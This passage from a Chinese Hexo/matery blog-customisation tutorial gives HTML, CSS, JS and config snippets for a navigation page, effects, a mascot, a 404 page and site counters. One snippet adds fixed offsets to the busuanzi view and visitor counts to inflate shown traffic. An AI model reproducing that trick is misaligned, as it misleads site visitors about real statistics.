· 应&lt;/li&gt;                            &lt;li class="google_s"&gt;谷 · 歌&lt;/li&gt;                            &lt;li class="baidu_s"&gt;百 · 度&lt;/li&gt;                        &lt;/ul&gt;                    &lt;/div&gt; &lt;input name="wd" id="kw-2" maxlength="100" autocomplete="off" type="text"&gt;                &lt;/div&gt;                &lt;div class="qingkong" id="qingkong" title="清 · 空" style="display: none;"&gt;x&lt;/div&gt; &lt;input value="搜 · 索"                    id="su-2" type="submit"&gt;                &lt;ul class="keylist"&gt;&lt;/ul&gt;            &lt;/form&gt;        &lt;/div&gt; &lt;!-- 链接 --&gt;        &lt;div class="row tags-posts "&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;娱乐 · 影视&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.jd.com/" class="link-3" target="_blank"&gt;京东&lt;/a&gt;                        &lt;li&gt;&lt;a href="https://www.taobao.com/" class="link-3" target="_blank"&gt;淘宝&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.tmall.com/" class="link-3" target="_blank"&gt;天猫&lt;/a&gt;&lt;/li&gt;                        &lt;/li&gt;                        &lt;li&gt;&lt;a href="https://v.qq.com/" class="link-3" target="_blank"&gt;腾讯视频&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.iqiyi.com/" class="link-3" target="_blank"&gt;爱奇艺&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.bilibili.com/" class="link-3" target="_blank"&gt;哔哩哔哩&lt;/a&gt; &lt;/li&gt;                        &lt;li&gt;&lt;a href="https://music.163.com/" class="link-3" target="_blank"&gt;网易云音乐&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://y.qq.com/" class="link-3" target="_blank"&gt;QQ音乐&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.kugou.com/" class="link-3" target="_blank"&gt;酷狗音乐&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;社区 · Code&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.mobaijun.com/contact/" class="link-3" target="_blank"&gt;留言&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://github.com/" class="link-3" target="_blank"&gt;GitHub&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://coding.net/" class="link-3" target="_blank"&gt;Coding&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://juejin.im/" class="link-3" target="_blank"&gt;掘金&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://gitee.com/" class="link-3" target="_blank"&gt;码云&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.csdn.net/" class="link-3" target="_blank"&gt;CSDN&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.jianshu.com/" class="link-3" target="_blank"&gt;简书&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://segmentfault.com/" class="link-3" target="_blank"&gt;思否&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://cloud.tencent.com/developer/" class="link-3" target="_blank"&gt;云+社区&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;实用 · 工具&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://mdnice.com/" class="link-3" target="_blank"&gt;Nice编辑器&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://translate.google.cn/" class="link-3" target="_blank"&gt;谷歌翻译&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.uupoop.com/" class="link-3" target="_blank"&gt;在线PS&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.processon.com/" class="link-3" target="_blank"&gt;思维导图&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://wallhaven.cc/" class="link-3" target="_blank"&gt;超清壁纸&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://cli.im/" class="link-3" target="_blank"&gt;二维码&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.yinfans.me/" class="link-3" target="_blank"&gt;音范思&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.52pojie.cn/" class="link-3" target="_blank"&gt;吾爱破解&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://my.openwrite.cn/" class="link-3" target="_blank"&gt;OW分发&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;编程 · 学习&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.oschina.net/" class="link-3" target="_blank"&gt;开源中国&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://htmldog.com/" class="link-3" target="_blank"&gt;HTML狗&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.icourse163.org/" class="link-3" target="_blank"&gt;中国大学慕课&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.imooc.com/" class="link-3" target="_blank"&gt;慕课网&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.wxapp-union.com/" class="link-3" target="_blank"&gt;小程序&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.runoob.com/" class="link-3" target="_blank"&gt;菜鸟教程&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://blog.51cto.com/" class="link-3" target="_blank"&gt;51CTO&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.shiyanlou.com/library/" class="link-3" target="_blank"&gt;实验楼&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://spring.io/" class="link-3" target="_blank"&gt;Spring&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;资讯 · 趋势&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://www.huxiu.com/" class="link-3" target="_blank"&gt;虎嗅&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://insights.stackoverflow.com/" class="link-3" target="_blank"&gt;技术调查&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.asciiworld.com/" class="link-3" target="_blank"&gt;摸鱼&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://sspai.com/" class="link-3" target="_blank"&gt;少数派&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://zh.wikihow.com/" class="link-3" target="_blank"&gt;WikeHom&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.awesomes.cn/rank?sort=hot" class="link-3" target="_blank"&gt;前端趋势&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://github-trending.com/" class="link-3" target="_blank"&gt;GitHub趋势&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.tiobe.com/" class="link-3" target="_blank"&gt;编程趋势&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://trends.google.com/" class="link-3" target="_blank"&gt;Google趋势&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;            &lt;div class="col s12 m6 l4 friend-div" data-aos="zoom-in-up"&gt;                &lt;div class="card"&gt;                    &lt;div class="jj-list-tit"&gt;搜索 · 其他&lt;/div&gt;                    &lt;ul class="jj-list-con"&gt;                        &lt;li&gt;&lt;a href="https://ac.scmor.com/" class="link-3" target="_blank"&gt;谷歌镜像&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://www.pansoso.com/" class="link-3" target="_blank"&gt;网盘搜索&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="http://tool.mkblog.cn/music/" class="link-3" target="_blank"&gt;音乐搜索&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.dytt8.net/" class="link-3" target="_blank"&gt;电影天堂&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://carbon.now.sh/" class="link-3" target="_blank"&gt;代码图片&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.zhipin.com/" class="link-3" target="_blank"&gt;Boos&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://fontawesome.com/" class="link-3" target="_blank"&gt;图标库&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.qvdv.com/tools/qvdv-guid.html" class="link-3" target="_blank"&gt;在线工具&lt;/a&gt;                        &lt;/li&gt;                        &lt;li&gt;&lt;a href="http://zhongguose.com/" class="link-3" target="_blank"&gt;中国色&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;script&gt; /*选择搜索引擎*/ $('.Select-box ul').hover(function () { $(this).css('height', 'auto') }, function () { $(this).css('height', '40px') }); $('.Select-box-2 ul').hover(function () { $(this).css('height', 'auto') }, function () { $(this).css('height', '46px') }); $('.Select-box li').click(function () { var _tihs = $(this).attr('class'); var _html = $(this).html(); if (_tihs == 'baidu_s') { _tihs = 'https://www.baidu.com/s'; _name = 'wd'; } if (_tihs == 'google_s') { _tihs = 'https://www.google.com/search'; _name = 'q'; } if (_tihs == 'bing_s') { _tihs = 'https://www.bing.com/search'; _name = 'q'; } $('.baidu form').attr('action', _tihs); $('.this_s').html(_html); $('#kw').attr('name', _name); $('.Select-box ul').css('height', '40px') }); $('.Select-box-2 li').click(function () { var _tihs = $(this).attr('class'); var _html = $(this).html(); if (_tihs == 'baidu_s') { _tihs = 'https://www.baidu.com/s'; _name = 'wd'; } if (_tihs == 'google_s') { _tihs = 'https://www.google.com/search'; _name = 'q'; } if (_tihs == 'bing_s') { _tihs = 'https://www.bing.com/search'; _name = 'q'; } $('.baidu form').attr('action', _tihs); $('.this_s').html(_html); $('#kw-2').attr('name', _name); $('.Select-box-2 ul').css('height', '48px') }); //清空输入框内容 $('.qingkong').click(function () { cls(); $(this).css('display', 'none') }); function cls() { var sum = 0; var t = document.getElementsByTagName("INPUT"); for (var i = 0; i &lt; t.length; i++) { if (t[i].type == 'text') { ++sum; t[i].value = "";//清空 } } } //清空输入框按钮的显示和隐藏 function if_btn() { var btn_obj = document.getElementById("kw") || document.getElementById("kw-2"); var cls_btn = document.getElementById("qingkong"); var btn_obj_val; var times; //当元素获得焦点时 if (btn_obj == '' || btn_obj == null) { return false; //如果没有找到这个元素，则将函数返回，不继续执行 } btn_obj.onfocus = function () { times = setInterval(function () { btn_obj_val = btn_obj.value; if (btn_obj_val != 0) { cls_btn.style.display = "block"; } else { cls_btn.style.display = "none"; } }, 200); } //元素失去焦点时 btn_obj.onblur = function () { clearInterval(times); } } &lt;/script&gt;    &lt;/div&gt;&lt;/div&gt;&lt;style&gt;    * {        margin: 0;        padding: 0;        font-family: "微软雅黑"    }    ul,li,h1,h2,h3,h4,h5,h6,p,form,dl,dt,dd {        margin: 0px;        padding: 0px;        font-size: 14px;        font-weight: normal;    }    img {        border-style: none;    }    li {        list-style: none;        float: left    }    a {        text-decoration: none    }    .card {        background-color: rgba(25, 240, 229, 0);        width: 96%;        margin-left: 2%    }    .baidu {        float: left;        margin-left: 100px;    }    .baidu form {        position: relative    }    .Select-box ul {        height: 40px;        position: absolute;        left: -1px;        top: 0px;        z-index: 9999;        background: #FFF;        border: 1px solid #ccc;        border-top: none;        overflow: hidden    }    .Select-box li {        width: 60px;        line-height: 40px;        font-size: 14px;        color: #484848;        border: 0;        cursor: pointer;    }    .Select-box li:hover {        background: #3385ff;        color: #FFF;    }    .Select-box .this_s {        color: #317ef3;    }    .Select-box .this_s:hover {        background: #FFF;        color: #317ef3;    }    .qingkong {        position: absolute;        right: 120px;        top: 12px;        width: 18px;        height: 18px;        background: rgba(0, 0, 0, 0.1);        border-radius: 18px;        line-height: 16px;        color: #666666;        cursor: pointer;        text-align: center;        font-size: 14px;        display: none;    }    .qingkong:hover {        background: rgba(0, 0, 0, 0.2);    }    .qingkong:active {        background: rgba(0, 0, 0, 0.3);    }    .baidu-2 {        width: 100%;        height: 110px;        margin: 0 auto;        background: none;        padding-top: 50px;    }    .baidu-2 form {        width: 520px;        margin: 0 auto;    }    .baidu-2 input {        padding: 13px 8px;        opacity: 0.9;        font-size: 15px;    }    #Select-2 {        float: left;    }    .Select-box-2 {        text-align: center;        float: left;        position: relative;    }    .Select-box-2 ul {        height: 46px;        position: absolute;        left: 0px;        top: 1px;        z-index: 9999;        background: rgba(255, 255, 255, 0.9);        border: 1px solid #ccc;        border-top: none;        overflow: hidden    }    .Select-box-2 li {        width: 60px;        line-height: 46px;        font-size: 15px;        color: #484848;        border: 0;        cursor: pointer;    }    .Select-box-2 li:hover {        background: #3385ff;        color: #FFF;    }    .Select-box-2 .this_s {        color: #317ef3;    }    .Select-box-2 .this_s:hover {        background: none;        color: #317ef3;    }    #kw-2 {        width: 335px;        outline: 0;        border: 1px solid #ccc;        background: rgba(255, 255, 255, 0.2);        color: #000000;        padding-left: 70px;        font-weight: bold;    }    /*修改搜索框样式*/    #su-2 {        width: 90px;        background: blue;        border: none;        border-top: #3385ff 1px solid;        border-bottom: 1px solid #2d78f4;        color: #FFF;        cursor: pointer;        /*去轮廓阴影*/        outline: none;    }    /*光标移动到搜索框颜色*/    #su-2:hover {        background: blue;        border-bottom: 1px solid blue;    }    #su-2:active {        background: blue;        box-shadow: inset 1px 1px 3px blue;        -webkit-box-shadow: inset 1px 1px 3px blue;    }    .jj-list-tit {        font-size: 16px;        line-height: 25px;        color: #ffffff;        width: 100%;        padding-left: 38.5%;    }    .jj-list-con {        overflow: hidden;        margin: 0 auto    }    /*控制网站列表间距*/    .jj-list-con li {        width: 31.333%;        margin: 1%;    }    .link-3 {        display: block;        background: rgba(0, 0, 0, .35);        color: #FFF;        font-size: 13px;        text-align: center;        line-height: 35px;        padding: 4px 0;        border-radius: 2px;        transition: all 0.2s    }    .link-3:hover {        background: rgba(0, 0, 0, .45);        font-size: 15px;        font-weight: bold    }    /*1栏 小于584*/    @media only screen and (max-width: 584px) {        .navi-height {            height: 1300px;        }        .link-box {            margin-top: 5%;        }        .large-screen {            display: none;        }    }    /* 2栏 大于584 小于993px */    @media only screen and (min-width: 584px) and (max-width: 993px) {        .navi-height {            height: 800px;        }        .link-box {            margin-top: 5%;        }        .large-screen {            display: none;        }    }    /*3栏 大于993px*/    @media only screen and (min-width: 993px) {        .navi-height {            position: absolute;            width: 100%;            height: 100%;        }    }    /* 隐藏footer */    .page-footer {        display: none;    }&lt;/style&gt;&lt;% if (theme.banner.enable) { %&gt;&lt;script&gt;    // 每天切换 banner 图.  Switch banner image every day.    var bannerUrl = "&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('/medias/banner/') %&gt;" + new Date().getDay() + '.jpg';    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');&lt;/script&gt;&lt;% } else { %&gt;&lt;script&gt;    $('.bg-cover').css('background-image', 'url(&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('/medias/banner/0.jpg') %&gt;)');&lt;/script&gt;&lt;% } %&gt;</code></pre><h3 id="添加樱花特效"><a href="#添加樱花特效" class="headerlink" title="添加樱花特效"></a>添加樱花特效</h3><p>在 themes/matery/source/js 目录下新建 sakura.js 文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.2.7/source/js/sakura.js，将内容复制粘贴到" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@3.2.7/source/js/sakura.js，将内容复制粘贴到</a> sakura.js 即可。</p><p>然后再 themes/matery/layout/layout.ejs 文件内添加下面的内容：</p><pre><code>&lt;script type="text/javascript"&gt;//只在桌面版网页启用特效var windowWidth = $(window).width();if (windowWidth &gt; 768) {    document.write('&lt;script type="text/javascript" src="/js/sakura.js"&gt;&lt;\/script&gt;');}&lt;/script&gt;</code></pre><h3 id="删除评论"><a href="#删除评论" class="headerlink" title="删除评论"></a>删除评论</h3><p>删除评论需要打开leancloud，里面有专门管理comment的界面</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/21/blog/1.png" alt=""></p><h3 id="设置文章背景图"><a href="#设置文章背景图" class="headerlink" title="设置文章背景图"></a>设置文章背景图</h3><p>在img标签中加入图片链接<br>外链图片：<code>img:link</code> （使用外部链接访问博客时会快一点）<br>本地图片：<code>img: /source/images/xxx.jpg</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/21/blog/2.png" alt=""></p><h3 id="自定义内置标签"><a href="#自定义内置标签" class="headerlink" title="自定义内置标签"></a>自定义内置标签</h3><p>在themes/主题 下新建scripts文件夹，hexo会自动执行此文件夹的内容。<br>在scripts文件夾下新建block.js</p><pre><code>hexo.extend.tag.register('r', function(args, content){  var className =  args.join(' ');  return '&lt;div class="uk-alert uk-alert-danger"&gt;&lt;i class="fa fa-warning"&gt;&lt;/i&gt; ' + content + '&lt;/div&gt;';}, {ends: true});hexo.extend.tag.register('g', function(args, content){  var className =  args.join(' ');  return '&lt;div class="uk-alert uk-alert-success"&gt;&lt;i class="fa fa-check-circle"&gt;&lt;/i&gt; ' + content + '&lt;/div&gt;';}, {ends: true});hexo.extend.tag.register('y', function(args, content){  var className =  args.join(' ');  return '&lt;div class="uk-alert uk-alert-warning"&gt;&lt;i class="fa fa-exclamation-circle"&gt;&lt;/i&gt; ' + content + '&lt;/div&gt;';}, {ends: true});</code></pre><p>在themes/主题/source/css/my.css內添加</p><pre><code>.uk-alert {  margin-bottom: 15px;  padding: 10px;  background: #ebf7fd;  color: #2d7091;  border: 1px solid rgba(45, 112, 145, 0.3);  border-radius: 4px;  text-shadow: 0 1px 0 #ffffff;}/* Modifier: `uk-alert-success` ========================================================================== */.uk-alert-success {  background: #f2fae3;  color: #659f13;  border-color: rgba(101, 159, 19, 0.3);}/* Modifier: `uk-alert-warning` ========================================================================== */.uk-alert-warning {  background: #fffceb;  color: #e28327;  border-color: rgba(226, 131, 39, 0.3);}/* Modifier: `uk-alert-danger` ========================================================================== */.uk-alert-danger {  background: #fff1f0;  color: #d85030;  border-color: rgba(216, 80, 48, 0.3);}</code></pre><p>然後就可以使用了。<br>用法：</p><pre><code>{%r%}紅色{%endr%}{%g%}綠色{%endg%}{%y%}黃色{%endy%}</code></pre><h3 id="看板娘"><a href="#看板娘" class="headerlink" title="看板娘"></a>看板娘</h3><ol><li><a href="https://huaji8.top/post/live2d-plugin-2.0/" target="_blank" rel="noopener">模型预览</a>，记住想要下载的模型名字</li><li>安装live2d模块，博客根目录cmd输入代码</li></ol><pre><code>npm install --save hexo-helper-live2d</code></pre><ol start="3"><li>下载模型，比如我选择的是shizuku模型</li></ol><pre><code>npm install live2d-widegt-model-shizuku</code></pre><ol start="4"><li>配置模型，找到根目录的config文件，在最后添加以下代码(注意缩进格式)position可以选left或者right。mobile可以选择显示或者不显示。</li></ol><pre><code>live2d:   enable: true   scriptFrom: local   pluginRootPath: live2dw/   pluginJsPath: lib/   pluginModelPath: assets/   tagMode: false   debug: false   model:     use: live2d-widget-model-koharu   display:     position: right     width: 150     height: 300   mobile:     show: true</code></pre><h2 id="Node版本问题"><a href="#Node版本问题" class="headerlink" title="Node版本问题"></a>Node版本问题</h2><p><a href="https://blog.csdn.net/u010263423/article/details/106981801" target="_blank" rel="noopener">https://blog.csdn.net/u010263423/article/details/106981801</a></p><h2 id="博客安装指导"><a href="#博客安装指导" class="headerlink" title="博客安装指导"></a>博客安装指导</h2><p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-23" target="_blank" rel="noopener">https://sunhwee.com/posts/6e8839eb.html#toc-heading-23</a></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><pre><code>cnpm install -g hexo-clihexo init</code></pre><h2 id="新建文章模板修改"><a href="#新建文章模板修改" class="headerlink" title="新建文章模板修改"></a>新建文章模板修改</h2><p>首先为了新建文章方便，我们可以修改一下文章模板，建议将<code>/scaffolds/post.md</code>修改为如下代码：</p><pre><code>---title: {{ title }}date: {{ date }}author: img: coverImg: top: falsecover: falsetoc: truemathjax: falsepassword:summary:tags:categories:---</code></pre><p>这样新建文章后 一些<code>Front-matter</code>参数不用你自己补充了，修改对应信息就可以了。</p><h2 id="添加404页面"><a href="#添加404页面" class="headerlink" title="添加404页面"></a>添加404页面</h2><pre><code>title: 404date: 2019-08-5 16:41:10type: "404"layout: "404"description: "Oops～，我崩溃了！找不到你想要的页面 :("</code></pre><p>然后在<code>/themes/matery/layout/</code>目录下新建一个<code>404.ejs</code>文件，内容如下：</p><pre><code>&lt;style type="text/css"&gt;    /* don't remove. */    .about-cover {        height: 75vh;    }&lt;/style&gt;&lt;div class="bg-cover pd-header about-cover"&gt;    &lt;div class="container"&gt;        &lt;div class="row"&gt;            &lt;div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2"&gt;                &lt;div class="brand"&gt;                    &lt;div class="title center-align"&gt;                        404                    &lt;/div&gt;                    &lt;div class="description center-align"&gt;                        &lt;%= page.description %&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script&gt;    // 每天切换 banner 图.  Switch banner image every day.    $('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');&lt;/script&gt;</code></pre><h2 id="“关于”页面增加简历（可选）"><a href="#“关于”页面增加简历（可选）" class="headerlink" title="“关于”页面增加简历（可选）"></a>“关于”页面增加简历（可选）</h2><p>修改<code>/themes/matery/layout/about.ejs</code>，找到<code>标签，然后找到它对应的</code>标签，接在后面新增一个<code>card</code>，语句如下：</p><pre><code>&lt;div class="card"&gt;    &lt;div class="card-content"&gt;        &lt;div class="card-content article-card-content"&gt;                &lt;div class="title center-align" data-aos="zoom-in-up"&gt;                    &lt;i class="fa fa-address-book"&gt;&lt;/i&gt;&amp;nbsp;&amp;nbsp;&lt;%- __('myCV') %&gt;                &lt;/div&gt;                &lt;div id="articleContent" data-aos="fade-up"&gt;                    &lt;%- page.content %&gt;                &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><p>这样就会多出一张<code>card</code>，然后可以在<code>/source/about/index.md</code>下面写上你的简历了，当然这里的位置随你自己设置，你也可以把简历作为第一个<code>card</code></p><h2 id="增加建站时间"><a href="#增加建站时间" class="headerlink" title="增加建站时间"></a>增加建站时间</h2><p>修改<code>/themes/matery/layout/_partial</code>中的<code>footer.ejs</code>，在最后加上：</p><pre><code>&lt;script language=javascript&gt;    function siteTime() {        window.setTimeout("siteTime()", 1000);        var seconds = 1000;        var minutes = seconds * 60;        var hours = minutes * 60;        var days = hours * 24;        var years = days * 365;        var today = new Date();        var todayYear = today.getFullYear();        var todayMonth = today.getMonth() + 1;        var todayDate = today.getDate();        var todayHour = today.getHours();        var todayMinute = today.getMinutes();        var todaySecond = today.getSeconds();        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)        year - 作为date对象的年份，为4位年份值        month - 0-11之间的整数，做为date对象的月份        day - 1-31之间的整数，做为date对象的天数        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数        minutes - 0-59之间的整数，做为date对象的分钟数        seconds - 0-59之间的整数，做为date对象的秒数        microseconds - 0-999之间的整数，做为date对象的毫秒数 */        var t1 = Date.UTC(2017, 09, 11, 00, 00, 00); //北京时间2018-2-13 00:00:00        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);        var diff = t2 - t1;        var diffYears = Math.floor(diff / years);        var diffDays = Math.floor((diff / days) - diffYears * 365);        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/    siteTime();&lt;/script&gt;</code></pre><p>然后在合适的地方（比如<code>copyright</code>声明后面）加上下面的代码就行了：</p><pre><code>&lt;span id="sitetime"&gt;&lt;/span&gt;</code></pre><h2 id="修改不蒜子初始化计数"><a href="#修改不蒜子初始化计数" class="headerlink" title="修改不蒜子初始化计数"></a>修改不蒜子初始化计数</h2><p>因为不蒜子至今未开放注册，所以没办法在官网修改初始化，只能自己动手了。和上一条一样，我们在<code>/themes/matery/layout/_partial</code>里的<code>footer.ejs</code>文件最后加上：</p><pre><code>&lt;script&gt;    $(document).ready(function () {        var int = setInterval(fixCount, 50);  // 50ms周期检测函数        var pvcountOffset = 80000;  // 初始化首次数据        var uvcountOffset = 20000;        function fixCount() {            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);                clearInterval(int);            }            if ($("#busuanzi_container_site_pv").css("display") != "none") {                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据                 clearInterval(int); // 停止检测            }        }    });&lt;/script&gt;</code></pre><p>然后把上面几行有段代码：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalTraffic) { %&gt;    &lt;span id="busuanzi_container_site_pv"&gt;        &lt;i class="fa fa-heart-o"&gt;&lt;/i&gt;        本站总访问量 &lt;span id="busuanzi_value_site_pv" class="white-color"&gt;&lt;/span&gt;    &lt;/span&gt;&lt;% } %&gt;&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalNumberOfvisitors) { %&gt;    &lt;span id="busuanzi_container_site_uv"&gt;        人次,&amp;nbsp;访客数 &lt;span id="busuanzi_value_site_uv" class="white-color"&gt;&lt;/span&gt; 人.    &lt;/span&gt;&lt;% } %&gt;</code></pre><p>修改为：</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalTraffic) { %&gt;    &lt;span id="busuanzi_container_site_pv" style='display:none'&gt;        &lt;i class="fa fa-heart-o"&gt;&lt;/i&gt;        本站总访问量 &lt;span id="busuanzi_value_site_pv" class="white-color"&gt;&lt;/span&gt;    &lt;/span&gt;&lt;% } %&gt;&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalNumberOfvisitors) { %&gt;    &lt;span id="busuanzi_container_site_uv" style='display:none'&gt;        人次,&amp;nbsp;访客数 &lt;span id="busuanzi_value_site_uv" class="white-color"&gt;&lt;/span&gt; 人.    &lt;/span&gt;&lt;% } %&gt;</code></pre><p>其实就是增加了两个<code>style='display:none'</code>而已</p><h2 id="添加动漫人物"><a href="#添加动漫人物" class="headerlink" title="添加动漫人物"></a>添加动漫人物</h2><pre><code>npm install --save hexo-helper-live2dnpm install live2d-widget-model-hijiki</code></pre><p>这里的动漫模型可以改，只需要下载对应模型就行了，你可以官方仓库去看有哪些模型，下载你喜欢的就行。<a href="https://blog.csdn.net/wang_123_zy/article/details/87181892" target="_blank" rel="noopener">https://blog.csdn.net/wang_123_zy/article/details/87181892</a></p><p>在根目录配置文件中添加如下代码：</p><pre><code>live2d:    enable: true    scriptFrom: local    pluginRootPath: live2dw/    pluginJsPath: lib/    pluginModelPath: assets/    tagMode: false    log: false    model:        use: live2d-widget-model-hijiki    display:        position: left        width: 150        height: 300    mobile:        show: false    react:        opacity: 0.7</code></pre><p>然后<code>hexo g</code>再<code>hexo s</code>就能预览出效果了，但是有个注意的地方，<strong>这个动漫人物最好不要和不蒜子同时使用</strong>，不然不蒜子会显示不出来。至于解决办法后续更新。</p><p><strong>解决动漫人物和不蒜子不能同时使用的<code>bug</code>（2019.08.11）</strong>：</p><p>打开<code>themes\matery\layout\_partial</code>中的<code>footer.ejs</code>，将本站总访问量和访客数的代码改为如下</p><pre><code>&lt;% if (theme.busuanziStatistics &amp;&amp; theme.busuanziStatistics.totalTraffic) { %&gt;          &lt;span id="busuanzi_container_site_pv" style='display:none'&gt;&lt;/span&gt;        &lt;i class="fa 